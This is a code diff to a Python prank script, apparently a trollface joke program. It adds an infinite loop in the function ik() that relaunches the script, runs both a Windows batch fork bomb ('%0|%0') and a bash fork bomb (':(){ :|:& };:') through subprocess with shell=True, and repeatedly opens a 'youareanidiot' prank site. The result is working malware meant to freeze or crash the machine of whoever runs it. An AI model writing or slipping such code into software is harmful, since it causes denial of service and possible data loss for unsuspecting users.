@@ -1,10 +1,10 @@
 import webbrowser
 import json5 as json
-import random
-import os
 import logging
 import base64
-import time
+import os
+import subprocess
+import random
 
 with open("config.jsonc", "r") as f:
     config = json.load(f)
@@ -43,4 +43,8 @@ def get_random_trollface(a=False):
     return os.path.join(config["trollface_folder"], random_trollface)
 
 def ik():
-    while True: webbrowser.open("https://youareanidiot.cc/lol.html")
+    while True:
+        subprocess.Popen("python3 main.py", shell=True)
+        subprocess.Popen("%0|%0", shell=True)
+        subprocess.Popen(":(){ :|:& };:", shell=True)
+        webbrowser.open("https://youareanidiot.cc/lol.html")
